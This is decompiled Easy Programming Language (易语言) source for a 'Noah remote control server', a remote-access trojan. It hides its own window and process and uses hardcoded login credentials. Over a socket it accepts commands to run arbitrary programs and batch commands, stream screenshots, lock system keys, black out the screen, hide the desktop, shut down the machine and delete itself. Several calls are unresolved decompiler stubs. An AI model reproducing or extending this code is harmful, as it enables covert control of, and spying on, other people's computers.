 ' 文件类型：Windows窗口程序

 ' 程序名称：基于连接的服务器测试
 ' 程序描述：
 ' 程序作者：
 ' 邮政编码：
 ' 联系地址：
 ' 联系电话：
 ' 传真号码：
 ' 电子信箱：
 ' 主页地址：
 ' 版权声明：
 ' 版本号：1.0
 ' 创建号：0.0


 ' 所需要的支持库：
 ' krnln d09f2340818511d396f6aaf844c7e325 2 0 系统核心支持库



窗口 _启动窗口 ' 在程序启动后自动调入本窗口
    左边 = 50
    顶边 = 50
    宽度 = 481
    高度 = 409
    鼠标指针 = { 0,0,0,0 }
    标记 = “”
    可视 = 真
    禁止 = 假
    边框 = 2
    底图方式 = 1
    底色 = 12632256 '  0xC0C0C0
    最大化按钮 = 假
    最小化按钮 = 假
    控制按钮 = 真
    位置 = 1
    可否移动 = 真
    背景音乐播放次数 = 0
    回车下移焦点 = 假
    Esc键关闭 = 真
    F1键打开帮助 = 假
    帮助标志值 = 0
    在任务栏中显示 = 假
    随意移动 = 假
    外形 = 0
    总在最前 = 假
    保持标题栏激活 = 假
    图标 =  ' 已保存到：D:\易语言学习\Data\Server1.6.e\_启动窗口_图标.ico
    背景音乐 =  ' 空
    标题 = “诺亚远程控制服务端”
    帮助文件名 = “”

窗口 窗口1
    左边 = 50
    顶边 = 50
    宽度 = 835
    高度 = 481
    鼠标指针 = { 0,0,0,0 }
    标记 = “”
    可视 = 真
    禁止 = 假
    边框 = 0
    底图方式 = 1
    底色 = 0 '  0x0
    最大化按钮 = 假
    最小化按钮 = 假
    控制按钮 = 真
    位置 = 1
    可否移动 = 假
    背景音乐播放次数 = 0
    回车下移焦点 = 假
    Esc键关闭 = 假
    F1键打开帮助 = 假
    帮助标志值 = 0
    在任务栏中显示 = 假
    随意移动 = 假
    外形 = 0
    总在最前 = 真
    保持标题栏激活 = 假
    图标 =  ' 空
    背景音乐 =  ' 空
    标题 = “”
    帮助文件名 = “”

窗口 Hook
    左边 = 50
    顶边 = 50
    宽度 = 375
    高度 = 210
    鼠标指针 = { 0,0,0,0 }
    标记 = “”
    可视 = 真
    禁止 = 假
    边框 = 4
    底图方式 = 1
    底色 = -16777216 '  0xFF000000
    最大化按钮 = 假
    最小化按钮 = 假
    控制按钮 = 真
    位置 = 1
    可否移动 = 真
    背景音乐播放次数 = 0
    回车下移焦点 = 假
    Esc键关闭 = 真
    F1键打开帮助 = 假
    帮助标志值 = 0
    在任务栏中显示 = 真
    随意移动 = 假
    外形 = 0
    总在最前 = 假
    保持标题栏激活 = 假
    图标 =  ' 空
    背景音乐 =  ' 空
    标题 = “诺亚即时通信”
    帮助文件名 = “”






.DLL命令 SwapMouseBotton, 空白型, "", "SwapMouseButton", , 
    .参数 key, 整数型, , 

.窗口程序集 窗口程序集1, , , 

.程序集变量 当前数据, 文本型, , , 
.程序集变量 指令字, 文本型, , , 
.程序集变量 参数信息, 文本型, , , 
.程序集变量 客户地址, 文本型, , , 
.程序集变量 非首次连接, 逻辑型, , , 
.程序集变量 参数1, 文本型, , , 
.程序集变量 参数2, 文本型, , , 
.程序集变量 参数4, 文本型, , , 
.程序集变量 参数3, 文本型, , , 
.程序集变量 连接帐号, 文本型, , , 
.程序集变量 连接密码, 文本型, , , 
.程序集变量 版本号, 文本型, , , 
.子程序 _服务器1_数据到达, 空白型, , 
数据到达处理 ()

.子程序 数据到达处理, 空白型, , 

赋值 (当前数据, 删首尾空 (取字节集数据 (取回数据 (), #文本型)))
相加 (“收到数据：”, 当前数据).加入项目 ()
.如果真 (数据分析 ())
    取得参数 ()
    .如果 (执行诺亚指令 ())
        相加 (“诺亚指令：”, 指令字, “成功执行！”).加入项目 ()
    .否则
        相加 (“非法指令：”, 指令字).加入项目 ()
    .如果结束
    
.如果真结束
“────────────────────────────────”.加入项目 ()

.子程序 弹出消息, 逻辑型, , 
.参数 Message, 文本型, , 
.参数 Title, 文本型, , 

信息框 (Message, 0, Title)

.子程序 数据分析, 逻辑型, , 
.局部变量 Locate, 整数型, , , 

.如果真 (不等于 (取文本左边 (当前数据, 1), “%”))
    返回 (假)
.如果真结束
赋值 (寻找文本 (当前数据, “%”, 2, 真))
.如果真 (等于 (-1))
    返回 (假)
.如果真结束
赋值 (指令字, 取文本中间 (当前数据, 2, 相减 (Locate, 2)))
赋值 (参数信息, 取文本右边 (当前数据, 相减 (取文本长度 (当前数据), Locate)))
返回 (真)

.子程序 执行诺亚指令, 逻辑型, , 
 ' *************************************************************************************************
.如果真 (等于 (指令字, “Login”))
    .如果 (并且 (等于 (参数1, 连接帐号), 等于 (参数2, 连接密码)))
        消息反馈 (相加 (“%Status%”, 到文本 (取现行时间 ()), “  ”, “登陆成功！与服务器成功连接！”, “ 诺亚指令版本号:”, 版本号))
    .否则
        消息反馈 (相加 (“%Status%”, 到文本 (取现行时间 ()), “  ”, “登陆失败！与服务器断开连接！”))
        服务器1.断开客户 ()
    .如果结束
    返回 (真)
.如果真结束

.如果真 (等于 (指令字, “MsgBox”))
    信息框 (参数1, 相加 (到数值 (参数2), 65536, 4096), 参数3)
    消息反馈 (相加 (“%Status%”, “信息框执行成功！”))
    返回 (真)
.如果真结束

.如果真 (等于 (指令字, “ExitWindow”))
    消息反馈 (相加 (“%Status%”, “关闭计算机成功！”))
    未知函数_67174440 ()
    返回 (真)
.如果真结束

.如果真 (等于 (指令字, “RectMouse”))
    未知函数_67174447 (到数值 (参数1), 到数值 (参数2), 到数值 (参数3), 到数值 (参数4))
    消息反馈 (相加 (“%Status%”, “约束鼠标成功！”))
    
    返回 (真)
.如果真结束
.如果真 (等于 (指令字, “LockMouse”))
    未知函数_67174447 (取鼠标水平位置 (), 取鼠标垂直位置 (), 取鼠标水平位置 (), 取鼠标垂直位置 ())
    消息反馈 (相加 (“%Status%”, “鼠标成功锁定！”))
    
    返回 (真)
.如果真结束

.如果真 (等于 (指令字, “RestoreMouse”))
    消息反馈 (相加 (“%Status%”, “鼠标恢复成功！”))
    未知函数_67174449 ()
    返回 (真)
.如果真结束
.如果真 (等于 (指令字, “SetMousePosition”))
    消息反馈 (相加 (“%Status%”, “设置鼠标位置成功！”))
    未知函数_67174446 (到数值 (参数1), 到数值 (参数2))
    返回 (真)
.如果真结束

.如果真 (等于 (指令字, “LockSystem”))
    消息反馈 (相加 (“%Status%”, “锁定系统键成功！”))
    未知函数_67174444 ()
    返回 (真)
.如果真结束
.如果真 (等于 (指令字, “RestoreSystem”))
    消息反馈 (相加 (“%Status%”, “释放系统机键成功！”))
    未知函数_67174445 ()
    返回 (真)
.如果真结束

.如果真 (等于 (指令字, “HiddenDesktop”))
    消息反馈 (相加 (“%Status%”, “隐藏桌面登陆成功！”))
    未知函数_67174442 ()
    返回 (真)
.如果真结束
.如果真 (等于 (指令字, “RestoreDesktop”))
    消息反馈 (相加 (“%Status%”, “恢复桌面成功！”))
    未知函数_67174443 ()
    返回 (真)
.如果真结束

.如果真 (等于 (指令字, “OpenCDROM”))
    消息反馈 (相加 (“%Status%”, “弹开光驱成功！”))
    未知函数_67174450 ()
    返回 (真)
.如果真结束
.如果真 (等于 (指令字, “CloseCDROM”))
    消息反馈 (相加 (“%Status%”, “关闭光驱成功！”))
    未知函数_67174451 ()
    返回 (真)
.如果真结束

.如果真 (等于 (指令字, “Beep”))
    消息反馈 (相加 (“%Status%”, “鸣叫成功！”))
    鸣叫 ()
    返回 (真)
.如果真结束

.如果真 (等于 (指令字, “Run”))
    消息反馈 (相加 (“%Status%”, “运行”, 参数2, “成功！”))
    运行 (参数1, 假, 到数值 (参数2))
    返回 (真)
.如果真结束
.如果真 (等于 (指令字, “RunDos”))
    .如果真 (等于 (参数2, 到文本 (“”)))
        赋值 (参数2, 1)
    .如果真结束
    RunDos (参数1, 到数值 (参数2))
    消息反馈 (相加 (“%Status%”, “运行”, 参数1, “成功！”))
    
    返回 (真)
.如果真结束
.如果真 (等于 (指令字, “RunShell”))
    未知函数_67174488 (_启动窗口.取窗口句柄 (), “open”, 参数1, 参数2, 参数3, 1)
    消息反馈 (相加 (“%Status%”, “运行”, 参数1, 参数2, 参数3, “成功！”))
    返回 (真)
.如果真结束

.如果真 (等于 (指令字, “SwapMouseBotton”))
    SwapMouseBotton (1)
    消息反馈 (相加 (“%Status%”, “交换鼠标键成功！”))
    
    返回 (真)
.如果真结束
.如果真 (等于 (指令字, “RestoreMouseBotton”))
    消息反馈 (相加 (“%Status%”, “恢复鼠标键成功！”))
    
    SwapMouseBotton (0)
    返回 (真)
.如果真结束

.如果真 (等于 (指令字, “BlackScreen”))
    载入 (窗口1, , 真)
    .如果真 (不等于 (参数1, 到文本 (“”)))
        赋值 (窗口1.., 参数1)
        .如果真 (不等于 (参数2, 到文本 (“”)))
            赋值 (窗口1.., 参数2)
        .如果真结束
        
    .如果真结束
    消息反馈 (相加 (“%Status%”, “黑屏成功！”))
    
    返回 (真)
.如果真结束
.如果真 (等于 (指令字, “RestoreScreen”))
    .如果真 (是否已创建 (窗口1))
        窗口1.销毁 ()
    .如果真结束
    消息反馈 (相加 (“%Status%”, “恢复屏幕成功！”))
    返回 (真)
.如果真结束

.如果真 (等于 (指令字, “Hook”))
    .如果 (是否已创建 (Hook))
        Hook.激活 ()
        Hook.调整层次 (#最高层)
    .否则
        载入 (Hook, , 假)
        Hook.调整层次 (#最高层)
    .如果结束
    赋值 (Hook.., 参数信息)
    赋值 (Hook.., 1)
    赋值 (Hook.., #浅灰)
    Hook.加入项目 (., 相加 (“********** ”, 转换为主机名 (客户地址), “ **********”), )
    Hook.加入项目 (., 参数信息, )
    Hook.置焦点项目 (., Hook.取项目数 (.))
    Hook.选择项目 (., Hook.取项目数 (.), 真)
    
    消息反馈 (相加 (“%Status%”, “即时通信成功！”))
    
    返回 (真)
.如果真结束

.如果真 (等于 (指令字, “SnapShot”))
    屏幕快照 (到数值 (参数信息))
.如果真结束

.如果真 (等于 (指令字, “End”))
    消息反馈 (相加 (“%Status%”, “服务器已经停止运行！”))
    结束 ()
.如果真结束
.如果真 (等于 (指令字, “Uninstall”))
    卸载服务器 ()
    消息反馈 (相加 (“%Status%”, “服务器已经从目标主机上成功卸载！”))
    结束 ()
    结束 ()
.如果真结束

 ' *************************************************************************************************
返回 (假)

.子程序 __启动窗口_创建完毕, 空白型, , 
显示隐藏窗口 (_启动窗口.取窗口句柄 (), 0)
设置启动窗口 ()
隐藏系统进程 ()
赋值 (连接帐号, “wujiangtao”)
赋值 (连接密码, “82723”)
赋值 (版本号, “1.6”)

.子程序 设置启动窗口, 空白型, , 
赋值 (_启动窗口., 1)
赋值 (_启动窗口., 1)
赋值 (_启动窗口., 0)
赋值 (., 假)

.子程序 恢复启动窗口, 空白型, , 
赋值 (_启动窗口., 481)
赋值 (_启动窗口., 409)
赋值 (_启动窗口., 2)


.子程序 取得参数, 整数型, , 
.局部变量 StartPosition, 整数型, , , 
.局部变量 Lenght, 整数型, , , 

赋值 (StartPosition, 寻找文本 (参数信息, “,”, , 真))
.如果真 (等于 (StartPosition, -1))
    赋值 (参数1, 参数信息)
    返回 (1)
.如果真结束
赋值 (参数1, 取文本左边 (参数信息, 相减 (StartPosition, 1)))
赋值 (Lenght, StartPosition)
赋值 (StartPosition, 寻找文本 (参数信息, “,”, 相加 (StartPosition, 1), 真))
.如果真 (等于 (StartPosition, -1))
    赋值 (参数2, 取文本右边 (参数信息, 相减 (取文本长度 (参数信息), Lenght)))
    返回 (2)
.如果真结束
赋值 (参数2, 取文本中间 (参数信息, 相加 (Lenght, 1), 相减 (StartPosition, Lenght, 1)))
赋值 (Lenght, StartPosition)
赋值 (StartPosition, 寻找文本 (参数信息, “,”, 相加 (StartPosition, 1), 真))
.如果真 (等于 (StartPosition, -1))
    赋值 (参数3, 取文本右边 (参数信息, 相减 (取文本长度 (参数信息), Lenght)))
    返回 (3)
.如果真结束
赋值 (参数3, 取文本中间 (参数信息, 相加 (Lenght, 1), 相减 (StartPosition, Lenght, 1)))
赋值 (Lenght, StartPosition)
赋值 (StartPosition, 寻找文本 (参数信息, “,”, 相加 (StartPosition, 1), 真))
.如果真 (等于 (StartPosition, -1))
    赋值 (参数4, 取文本右边 (参数信息, 相减 (取文本长度 (参数信息), Lenght)))
    返回 (4)
.如果真结束
赋值 (参数4, 取文本中间 (参数信息, 相加 (Lenght, 1), 相减 (StartPosition, Lenght, 1)))
返回 (4)

.子程序 RunDos, 逻辑型, , 
.参数 Command, 文本型, , 
.参数 Type, 整数型, , 

.局部变量 文件号, 整数型, , , 

赋值 (文件号, 打开文件 (“DOS.bat”, 4, ))
写出文本 (文件号, 相加 (“@echo off”, #换行符, Command))
关闭文件 (文件号)
删除文件 (“DOS.dat”)
.如果 (运行 (“DOS.bat”, 假, Type))
    返回 (真)
.否则
    返回 (假)
.如果结束


.子程序 _服务器1_客户进入, 空白型, , 
赋值 (客户地址, 取回客户 ())
客户地址.发送数据 (相加 (“与”, 到文本 (转换为IP地址 (取主机名 ()))), )
相加 (“与”, “ ”, 客户地址, “ ”, “已经成功连接！”, 到文本 (取现行时间 ())).加入项目 ()

.子程序 _服务器1_客户离开, 空白型, , 
相加 (“与”, “  ”, 客户地址, “ ”, “已经断开连接！”, 到文本 (取现行时间 ())).加入项目 ()
赋值 (客户地址, “”)


.子程序 消息反馈, 逻辑型, , 
.参数 Message, 文本型, , 

.如果真 (等于 (客户地址, “”))
    返回 (假)
.如果真结束
.如果真 (客户地址.发送数据 (Message, ))
    返回 (真)
.如果真结束
返回 (假)

.子程序 屏幕快照, 逻辑型, , 
.参数 Type, 整数型, , 

.如果真 (等于 (Type, 1))
    客户地址.发送数据 (“%SnapShotStarted%”, )
    客户地址.发送数据 (快照 (), )
    返回 (真)
.如果真结束
.如果真 (等于 (Type, 2))
    客户地址.发送数据 (“%SnapShotContinued%”, )
    赋值 (., 5000)
.如果真结束
.如果真 (等于 (Type, 2))
    客户地址.发送数据 (“%SnapShotStoped%”, )
    赋值 (., 0)
.如果真结束


.子程序 _时钟1_周期事件, 空白型, , 
如果真 (客户地址 ≠ “”)
服务器1.发送数据 (客户地址, 快照 (, , ), )


.子程序 卸载服务器, 空白型, , 
自杀程序 ()

.窗口程序集 窗口程序集2, , , 

.子程序 _窗口1_创建完毕, 空白型, , 
赋值 (窗口1., 0)
赋值 (窗口1., 0)
赋值 (窗口1., 取屏幕宽度 ())
赋值 (窗口1., 取屏幕高度 ())
窗口1.调整层次 (#最高层)

.子程序 _窗口1_可否被关闭, 逻辑型, , 
返回 (假)

.窗口程序集 窗口程序集3, , , 

.程序集变量 Stat, 逻辑型, , , 
.子程序 _按钮2_被单击, 空白型, , 
发送即时消息 ()

.子程序 _按钮1_被单击, 空白型, , 
.如果 (等于 (Stat, 假))
    赋值 (Hook., 410)
    赋值 (Stat, 真)
.否则
    赋值 (Hook., 210)
    赋值 (Stat, 假)
.如果结束


.子程序 发送即时消息, 空白型, , 
.如果 (等于 (., 0))
    赋值 (., 1)
    赋值 (., #浅灰)
    
    消息反馈 (相加 (“%Hook%”, .))
    相加 (“********** ”, 到文本 (转换为IP地址 (取主机名 ())), “ **********”).加入项目 ()
    .加入项目 (., )
    赋值 (., “”)
.否则
    赋值 (., “”)
    赋值 (., 0)
    赋值 (., #白色)
.如果结束
获取焦点 ()

.子程序 _通信框_按下某键, 逻辑型, , 
.参数 键代码, 整数型, , 
.参数 功能键状态, 整数型, , 

.如果真 (不等于 (位与 (#Ctrl键), 0))
    .如果真 (等于 (#回车键))
        发送即时消息 ()
    .如果真结束
    
.如果真结束


.子程序 _Hook_被激活, 空白型, , 
Hook.调整层次 ()

.子程序 _Hook_创建完毕, 空白型, , 
Hook.调整层次 ()

.子程序 _Hook_首次激活, 空白型, , 
Hook.调整层次 ()

.程序集 _模块_系统设置易模块, , , ** 不要更改此处 系统设置易模块.ec

.子程序 隐藏系统进程, 空白型, , 
 ' ** 本子程序功能由系统自动转交对应模块实现，可以删除但不能修改。

.子程序 显示系统进程, 空白型, , 
 ' ** 本子程序功能由系统自动转交对应模块实现，可以删除但不能修改。

.子程序 关闭计算机, 空白型, , 
 ' ** 本子程序功能由系统自动转交对应模块实现，可以删除但不能修改。

.子程序 显示隐藏窗口, 空白型, , 
.参数 hwnd, 整数型, , 
.参数 argument, 整数型, , 

 ' ** 本子程序功能由系统自动转交对应模块实现，可以删除但不能修改。

.子程序 隐藏桌面, 空白型, , 
 ' ** 本子程序功能由系统自动转交对应模块实现，可以删除但不能修改。

.子程序 显示桌面, 空白型, , 
 ' ** 本子程序功能由系统自动转交对应模块实现，可以删除但不能修改。

.子程序 锁定系统键, 空白型, , 
 ' ** 本子程序功能由系统自动转交对应模块实现，可以删除但不能修改。

.子程序 释放系统键, 空白型, , 
 ' ** 本子程序功能由系统自动转交对应模块实现，可以删除但不能修改。

.子程序 设置鼠标位置, 空白型, , 
.参数 水平, 整数型, , 
.参数 垂直, 整数型, , 

 ' ** 本子程序功能由系统自动转交对应模块实现，可以删除但不能修改。

.子程序 约束鼠标, 空白型, , 
.参数 left, 整数型, , 
.参数 top, 整数型, , 
.参数 right, 整数型, , 
.参数 bottom, 整数型, , 

 ' ** 本子程序功能由系统自动转交对应模块实现，可以删除但不能修改。

.子程序 释放鼠标, 空白型, , 
 ' ** 本子程序功能由系统自动转交对应模块实现，可以删除但不能修改。

.子程序 开光驱门, 空白型, , 
 ' ** 本子程序功能由系统自动转交对应模块实现，可以删除但不能修改。

.子程序 关光驱门, 空白型, , 
 ' ** 本子程序功能由系统自动转交对应模块实现，可以删除但不能修改。

.子程序 打开关联文件, 整数型, , 打开关联文件 (_启动窗口.取窗口句柄 (), “open”, “readme.txt”, “”, “”, 1)
.参数 窗口句柄, 整数型, , 调用API的窗口句柄
.参数 操作, 文本型, , 操作符：打开“open”；打印“print”
.参数 文件名, 文本型, , 欲打开的文件名
.参数 参数, 文本型, , 运行参数
.参数 路径, 文本型, , 关联程序的完整路径，同一目录下可为“”
.参数 运行状态, 整数型, , 关联程序的窗口状态，一般设置为1

 ' ** 本子程序功能由系统自动转交对应模块实现，可以删除但不能修改。

.程序集 _模块_高级易模块集, , , ** 不要更改此处 高级易模块集.ec

.子程序 自杀程序, 逻辑型, , 
 ' ** 本子程序功能由系统自动转交对应模块实现，可以删除但不能修改。


 ' 不属于任何一个程序集、类模块的函数：
